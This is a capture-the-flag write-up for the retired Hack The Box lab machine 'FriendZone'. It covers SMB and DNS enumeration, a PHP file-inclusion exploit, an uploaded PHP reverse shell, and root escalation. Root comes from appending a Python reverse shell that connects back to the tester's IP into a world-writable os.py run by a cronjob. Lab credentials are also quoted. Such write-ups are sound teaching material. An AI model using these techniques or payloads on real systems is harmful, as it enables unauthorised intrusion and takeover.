# FriendZone

This is the write-up for the box FriendZone that got retired at the 13th July 2019.
My IP address was 10.10.14.12 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.123    friendzone.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/friendzone.nmap 10.10.10.123
```

```markdown
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
[...]
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking SMB (Port 445)

Lets look for open shares:
```markdown
smbmap -H 10.10.10.123

smbclient -L //10.10.10.123
```

We get the following shares:
- print$ : NO ACCESS - Printer Drivers
- Files : NO ACCESS - /etc/Files
- general : READ ONLY
- Development : READ, WRITE
- IPC$ : NO ACCESS

We can guess that if _Files_ is in /etc/Files than the other folders are in _/etc/_, too.
And we have WRITE permissions on _Development_, lets remember that.

Recursively show files:
```markdown
smbmap -H 10.10.10.123 -R --depth 5
```

In the path _general_ there is the file _creds.txt_ that we can download:
```markdown
smbclient //10.10.10.123/general

get creds.txt
```

This file says:
> creds for the admin THING:
> admin:WORKWORKHhallelujah@#

We will probably need those credentials later.

## Enumerating HTTP (Port 80 and 443)

On the HTTP site we only get one interesting information. The email has the domain **friendzoneportal.red** that we did not know yet. If we check the certificate on the HTTPS, we get the domain **friendzone.red**.

Lets check those domains.

### Checking the domains we found

Checking the source file on that page **hxxps://friendzone.red** there is a comment that says:
> Just doing some development here
> /js/js
> Don't go deep ;)

Going to that path gives us some Base64 decoded string:
> Testing some functions !
> I'am trying not to break things !
> [Base64 string]

The Base64 string is uninteresting, but what is interesting is that by refreshing the page we always get an new string. So there is happening some dynamic stuff in the background.

The page **hxxps://friendzoneportal.red** has nothing interesting.

There is no attack surface here, so we probably need more domains.

### Enumerating DNS

Lets look for zone transfers and subdomains with _dig_:
```markdown
dig axfr @10.10.10.123 friendzone.red
dig axfr @10.10.10.123 friendzoneportal.red
```

We get the following subdomains:
- admin.friendzoneportal.red
- administrator1.friendzone.red
- files.friendzoneportal.red
- friendzone.red
- friendzoneportal.red
- hr.friendzone.red
- imports.friendzoneportal.red
- uploads.friendzone.red
- vpn.friendzoneportal.red

We put all of them in our hosts file.

Lets check every single webpage. For that we will use the tool **aquatone** that visits every page, gives us the HTTP code and makes a screenshot of the homepage.

With that method we find the interesting domains:
- Login portal: hxxps://administrator1.friendzone.red
- Login portal: hxxps://admin.friendzoneportal.red
- Uploads: hxxps://uploads.friendzone.red

The rest of the domains gives us the HTTP code _404 Not Found_ so we will work with the ones we have now.

### Enumerating the Subdomains

On **uploads.friendzone.red** we can upload something an get a timestamp back, nothing more.

On **admin.friendzoneportal.red** we can input a username and password and get the response:
> Admin page is not developed yet !!! check for another one

On **administrator1.friendzone.red** we can input a username and password and get _Wrong!_ when sending wrong credentials.
With the credentials we observed earlier from SMB we can log into the webpage and it says:
> Login Done ! visit /dashboard.php

On that path we get some PHP application that tells us how to use it:
> image_name is missed !
> please enter it to show the image
> default is image_id=a.jpg&pagename=timestamp

The parameter _pagename_ takes values like _login_ and _timestamp_ meaning we can access other files on the server with this application.
With a **PHP wrapper** we can access the source code of login.php by putting this in the URL:
```markdown
hxxps://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login
```

This displays us a Base64 string and decoding that gives us the source code of login.php. This file is not that important but we are able to read any other PHP file. But ONLY PHP files because the application automatically appends .php on every request.

## Uploading a Reverse Shell with SMB

So as we can upload files on _/etc/Development_ and can read PHP files with the web application we will use that to our advantage. Lets create a test.php file:
```php
<?php
echo("Test Message");
?>
```

Upload that via SMB:
```markdown
smbclient //10.10.10.123/Development

put test.php
```

Trying to execute it:
```markdown
hxxps://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
```

And this displays "Test Message" and we confirmed that we can execute any PHP file we want. Lets upload any PHP reverse shell and execute it the same way as we did before.

## Privilege Escalation

Now we opened a reverse shell connection and are logged in as the user _www-data_. After checking the files in _/var/www_ we find credentials in the file **mysql_data.conf**:
> db_user=friend
db_pass=Agpyu12!0.213$

As there is no database running on the server we try the credentials to see if we can login with SSH and it works. We are now the user _friend_ on this box and can read user.txt!

After enumerating the server we find the directory _/opt/server_admin_ with a file **reporter.py**. The commands in the script are commented out except on _print_ line, but we can't exploit that.

We upload the tool **pspy** on the the server to check what and when the processes and programs run on the server and see that there is a cronjob that runs _reporter.py_ every few minutes.

As our attack surface is not defined yet we should run **LinEnum** or any other Linux Enumeration script. There is one interesting discovery:
> World-writable files:
> **/usr/lib/python2.7/os.py**

The script _reporter.py_ has this one line we will exploit:
```python
import os
```

As we can write into the library whatever we want, we have command execution. We put our own code at the end of the library _os.py_ and in that case we take a Python reverse shell:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.12",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

We are listening on port 9001 and wait until the cronjob executes the script. After it executes we get our reverse shell connection as root and can read root.txt!
